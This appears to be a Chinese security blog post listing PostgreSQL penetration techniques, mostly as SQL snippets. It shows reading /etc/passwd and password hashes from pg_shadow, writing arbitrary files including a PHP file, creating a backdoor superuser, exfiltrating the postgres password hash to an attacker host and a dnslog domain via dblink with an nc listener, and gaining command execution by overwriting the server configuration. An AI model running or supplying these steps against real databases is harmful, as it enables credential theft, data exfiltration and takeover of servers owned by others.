    <title>postgresql 另类渗透技巧</title>
    <link href="/2023/06/06/postgresql%20%E5%8F%A6%E7%B1%BB%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
    <url>/2023/06/06/postgresql%20%E5%8F%A6%E7%B1%BB%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="常用基础命令"><a href="#常用基础命令" class="headerlink" title="常用基础命令"></a>常用基础命令</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 查看数据库版本</span><br><span class="hljs-keyword">select</span> version();<br><span class="hljs-keyword">select</span> pg_read_file(<span class="hljs-string">&#x27;PG_VERSION&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">200</span>);<br><span class="hljs-keyword">SELECT</span> current_setting(<span class="hljs-string">&#x27;server_version_num&#x27;</span>);<br><br><span class="hljs-comment">-- 列目录</span><br><span class="hljs-keyword">select</span> pg_ls_dir(<span class="hljs-string">&#x27;/etc&#x27;</span>);<br><br><span class="hljs-comment">-- 获取 pgsql 安装目录</span><br><span class="hljs-keyword">select</span> setting <span class="hljs-keyword">from</span> pg_settings <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;data_directory&#x27;</span>;<br><br><span class="hljs-comment">-- 查找 pgsql 配置文件路径</span><br><span class="hljs-keyword">select</span> setting <span class="hljs-keyword">from</span> pg_settings <span class="hljs-keyword">where</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;config_file&#x27;</span>;<br><br>列出数据库<br><span class="hljs-keyword">SELECT</span> datname <span class="hljs-keyword">FROM</span> pg_database;<br><br><span class="hljs-comment">-- 查看支持的语言</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> pg_language;<br><br><span class="hljs-comment">-- 查看安装的扩展</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> pg_available_extensions;<br><br><span class="hljs-comment">-- 查看服务器ip地址</span><br><span class="hljs-keyword">select</span> inet_server_addr();<br><br><span class="hljs-comment">-- 查询用户管理员权限</span><br><span class="hljs-keyword">SELECT</span> current_setting(<span class="hljs-string">&#x27;is_superuser&#x27;</span>);<br><span class="hljs-keyword">SELECT</span> usesuper <span class="hljs-keyword">FROM</span> pg_user <span class="hljs-keyword">WHERE</span> usename = <span class="hljs-built_in">CURRENT_USER</span>;<br><span class="hljs-keyword">SELECT</span> usename <span class="hljs-keyword">FROM</span> pg_user <span class="hljs-keyword">WHERE</span> usesuper <span class="hljs-keyword">IS</span> <span class="hljs-keyword">TRUE</span>;<br><br><span class="hljs-comment">-- 查询用户密码</span><br><span class="hljs-keyword">SELECT</span> usename, passwd <span class="hljs-keyword">FROM</span> pg_shadow;<br><span class="hljs-keyword">SELECT</span> rolname,rolpassword <span class="hljs-keyword">FROM</span> pg_authid;<br><br><span class="hljs-comment">-- 查询用户密码加密方式</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-type">name</span>,setting,source,enumvals <span class="hljs-keyword">FROM</span> pg_settings <span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;password_encryption&#x27;</span>;<br><br><span class="hljs-comment">-- 查询当前用户</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">current_user</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">session_user</span>;<br><span class="hljs-keyword">SELECT</span> usename <span class="hljs-keyword">FROM</span> pg_user;<br><span class="hljs-keyword">SELECT</span> getpgusername();<br><br><span class="hljs-comment">-- 添加用户</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> testname <span class="hljs-keyword">password</span> <span class="hljs-string">&#x27;testpass&#x27;</span> <span class="hljs-keyword">superuser</span> <span class="hljs-keyword">createrole</span> <span class="hljs-keyword">createdb</span>;<br><span class="hljs-keyword">grant</span> postgres <span class="hljs-keyword">to</span> testname;<br><br><span class="hljs-comment">-- 修改用户密码</span><br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> testname <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">PASSWORD</span> <span class="hljs-string">&#x27;new_password&#x27;</span>;<br><br></code></pre></td></tr></table></figure><h2 id="PostgrelSQL-读文件"><a href="#PostgrelSQL-读文件" class="headerlink" title="PostgrelSQL 读文件"></a>PostgrelSQL 读文件</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 方式一</span><br><span class="hljs-keyword">select</span> pg_read_file(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">select</span> PG_READ_FILE($$<span class="language-ruby">/etc/passwd<span class="hljs-variable">$$</span></span>);<br><br><span class="hljs-comment">-- 方式二</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> cmd_test(output <span class="hljs-type">TEXT</span>);<br><span class="hljs-keyword">copy</span> cmd_test <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/etc/passwd&#x27;</span>;<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> cmd_test <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">--  方式三</span><br><span class="hljs-keyword">Select</span> lo_import(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>,<span class="hljs-number">12345678</span>);<br><span class="hljs-keyword">select</span> array_agg(b)::<span class="hljs-type">text</span>::<span class="hljs-type">int</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> encode(data,<span class="hljs-string">&#x27;hex&#x27;</span>)b,pageno <span class="hljs-keyword">from</span> pg_largeobject <span class="hljs-keyword">where</span> loid=<span class="hljs-number">12345678</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> pageno)a<br><br><span class="hljs-keyword">select</span> lo_import($$<span class="language-ruby">/etc/passwd<span class="hljs-variable">$$</span></span>,<span class="hljs-number">11111</span>);<br><span class="hljs-keyword">select</span> cast(encode(data,$$<span class="language-ruby">base64<span class="hljs-variable">$$</span></span>)<span class="hljs-keyword">as</span> <span class="hljs-type">integer</span>) <span class="hljs-keyword">from</span> pg_largeobject <span class="hljs-keyword">where</span> loid=<span class="hljs-number">11111</span><br><br></code></pre></td></tr></table></figure><h2 id="PostgrelSQL-写文件"><a href="#PostgrelSQL-写文件" class="headerlink" title="PostgrelSQL 写文件"></a>PostgrelSQL 写文件</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 方式一</span><br><span class="hljs-keyword">COPY</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>) <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;/tmp/1.php&#x27;</span>;<br><span class="hljs-keyword">COPY</span> (<span class="hljs-keyword">select</span> convert_from(decode(<span class="hljs-string">&#x27;ZmZmZmZmZmYweA==&#x27;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>),<span class="hljs-string">&#x27;utf-8&#x27;</span>)) <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;/tmp/success.txt&#x27;</span>;<br><br><span class="hljs-comment">-- 方式二</span><br><span class="hljs-keyword">select</span> lo_from_bytea(<span class="hljs-number">12349</span>,<span class="hljs-string">&#x27;ffffffff0x&#x27;</span>);<br><span class="hljs-keyword">SELECT</span> lo_export(<span class="hljs-number">12349</span>, <span class="hljs-string">&#x27;/tmp/ffffffff0x.txt&#x27;</span>);<br><br><span class="hljs-keyword">select</span> lo_from_bytea(<span class="hljs-number">12350</span>,decode(<span class="hljs-string">&#x27;ZmZmZmZmZmYweA==&#x27;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>));<br><span class="hljs-keyword">SELECT</span> lo_export(<span class="hljs-number">12350</span>, <span class="hljs-string">&#x27;/tmp/ffffffff0x.txt&#x27;</span>);<br><br><span class="hljs-comment">-- 方式三</span><br><span class="hljs-keyword">select</span> lo_creat(<span class="hljs-number">24577</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> pg_largeobject(loid, pageno, data) <span class="hljs-keyword">values</span> (<span class="hljs-number">24577</span>, <span class="hljs-number">0</span>, decode(<span class="hljs-string">&#x27;ZmZmZmZmZmYweA==&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>));<br><span class="hljs-keyword">select</span> lo_export(<span class="hljs-number">24577</span>, <span class="hljs-string">&#x27;/tmp/success.txt&#x27;</span>);<br><br><span class="hljs-keyword">SELECT</span> lo_create(<span class="hljs-number">12345</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> pg_largeobject <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">12345</span>, <span class="hljs-number">0</span>, decode(<span class="hljs-string">&#x27;6666&#x27;</span>, <span class="hljs-string">&#x27;hex&#x27;</span>));<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> pg_largeobject <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">12345</span>, <span class="hljs-number">1</span>, decode(<span class="hljs-string">&#x27;666666&#x27;</span>, <span class="hljs-string">&#x27;hex&#x27;</span>));<br><span class="hljs-keyword">SELECT</span> lo_export(<span class="hljs-number">12345</span>, <span class="hljs-string">&#x27;/tmp/ffffffff0x.txt&#x27;</span>);<br><span class="hljs-keyword">SELECT</span> lo_unlink(<span class="hljs-number">12345</span>);<br><br><span class="hljs-keyword">select</span> lo_create(<span class="hljs-number">11116</span>);<br><span class="hljs-keyword">select</span> lo_put(<span class="hljs-number">11116</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;dGVzdDEyM&#x27;</span>);<br><span class="hljs-keyword">select</span> lo_put(<span class="hljs-number">11116</span>,<span class="hljs-number">9</span>,<span class="hljs-string">&#x27;zQ1Ng==&#x27;</span>);<br><span class="hljs-keyword">select</span> lo_from_bytea(<span class="hljs-number">11141</span>,decode(encode(lo_get(<span class="hljs-number">11116</span>),<span class="hljs-string">&#x27;escape&#x27;</span>),<span class="hljs-string">&#x27;base64&#x27;</span>));<br><span class="hljs-keyword">select</span> lo_export(<span class="hljs-number">11141</span>,<span class="hljs-string">&#x27;/tmp/test.txt&#x27;</span>);<br><span class="hljs-keyword">SELECT</span> lo_unlink(<span class="hljs-number">11141</span>);<br><br></code></pre></td></tr></table></figure><h2 id="PostgrelSQL带外数据"><a href="#PostgrelSQL带外数据" class="headerlink" title="PostgrelSQL带外数据"></a>PostgrelSQL带外数据</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 方式一</span><br><span class="hljs-comment">-- 开启 dblink 扩展</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">EXTENSION</span> dblink<br><br><span class="hljs-comment">-- 获取当前数据库用户名称</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> dblink(<span class="hljs-string">&#x27;host=&#x27;</span>||(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>)||<span class="hljs-string">&#x27;.djw0pg.dnslog.cn user=test dbname=test&#x27;</span>, <span class="hljs-string">&#x27;SELECT version()&#x27;</span>) <span class="hljs-keyword">RETURNS</span> (result <span class="hljs-type">TEXT</span>);<br><br><span class="hljs-comment">-- 方式二</span><br><span class="hljs-comment">-- nc 监听</span><br>nc -lvv <span class="hljs-number">4444</span><br><br><span class="hljs-keyword">select</span> dblink_connect((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;hostaddr=x.x.x.x port=4445 user=test password=test sslmode=disable dbname=&#x27;</span>||(<span class="hljs-keyword">SELECT</span> passwd <span class="hljs-keyword">FROM</span> pg_shadow <span class="hljs-keyword">WHERE</span> usename=<span class="hljs-string">&#x27;postgres&#x27;</span>)));<br><br></code></pre></td></tr></table></figure><h2 id="PostgrelSQL创建文件夹"><a href="#PostgrelSQL创建文件夹" class="headerlink" title="PostgrelSQL创建文件夹"></a>PostgrelSQL创建文件夹</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">利用条件<br>目标已经配置了 logging_collector=<span class="hljs-keyword">on</span>，默认配置<br><br>利用场景<br>往目标服务器写入ssh公钥需要在用户.ssh目录下，若没有该目录则需创建<br><br>步骤<br>通过前面的读写命令读取配置文件后修改再写入覆盖<br><br>重新加载配置文件<br><span class="hljs-keyword">select</span> pg_reload_conf();<br><br></code></pre></td></tr></table></figure><p><img src="/images/postgrel1.png" alt="图"></p><h2 id="利用-ssl-passphrase-command-执行命令"><a href="#利用-ssl-passphrase-command-执行命令" class="headerlink" title="利用 ssl_passphrase_command 执行命令"></a>利用 ssl_passphrase_command 执行命令</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">利用条件<br>postgresql &gt; <span class="hljs-number">11</span><br><br>利用场景<br>常规的<span class="hljs-keyword">copy</span>命令无法使用的情况下<br><br>步骤<br>读取配置文件查看目标是否配置了ssl<br>如果已经配置了最好直接使用目标的ssl密钥，如果没有再自己生成<br>openssl req -<span class="hljs-built_in">new</span> -x509 -days <span class="hljs-number">365</span> -nodes -<span class="hljs-type">text</span> -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.crt -keyout <span class="hljs-keyword">server</span>.key -subj &quot;/CN=test&quot;<br>openssl rsa -aes256 -<span class="hljs-keyword">in</span> <span class="hljs-keyword">server</span>.key -<span class="hljs-keyword">out</span> private_passphrase.key<br><br>生成后将证书<span class="hljs-keyword">server</span>.crt和私钥private_passphrase.key上传至目标服务器<br><br>修改覆盖配置文件<br><br>重新加载配置文件<br><span class="hljs-keyword">select</span> pg_reload_conf();<br><br>注<br>linux由于 pgsql 限制私钥文件权限必须是 <span class="hljs-number">0600</span> 才能够加载，因此私钥文件需覆盖PG_VERSION（与配置文件同目录下），覆盖后如果数据库重启会失败报错，所以需要及时将PG_VERSION文件恢复<br>windows不受限制<br><br></code></pre></td></tr></table></figure><p><img src="/images/postgrel2.png" alt="图"></p><h2 id="利用-archive-command-执行命令"><a href="#利用-archive-command-执行命令" class="headerlink" title="利用 archive_command 执行命令"></a>利用 archive_command 执行命令</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs">利用条件<br>重启数据库服务<br><br>利用场景<br>其他方式都无法使用的严苛情况下，适用于全版本<br><br>步骤<br>修改覆盖配置文件<br><br>等待数据库服务重启<br><br></code></pre></td></tr></table></figure><p><img src="/images/postgrel3.png" alt="图"></p><h2 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h2><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">udf提权<br><br>session_preload_libraries 执行命令<br><br><span class="hljs-meta prompt_">...</span><br><br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl">https:<span class="hljs-regexp">//</span>tttang.com/archive/<span class="hljs-number">1547</span>/<br><br>https:<span class="hljs-regexp">//</span>www.yulegeyu.com/<span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">16</span>/Postgresql-Superuser-SQL<span class="hljs-variable">%E</span>6<span class="hljs-variable">%B</span>3<span class="hljs-variable">%A</span>8<span class="hljs-variable">%E</span>5<span class="hljs-variable">%8</span>5<span class="hljs-variable">%A5</span>-RCE<span class="hljs-variable">%E</span>4<span class="hljs-variable">%B</span>9%8B<span class="hljs-variable">%E</span>6<span class="hljs-variable">%9</span>7<span class="hljs-variable">%85</span>/<br><br>https:<span class="hljs-regexp">//</span>evi1cg.me/archives/PostgreSQL-Injection.html<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
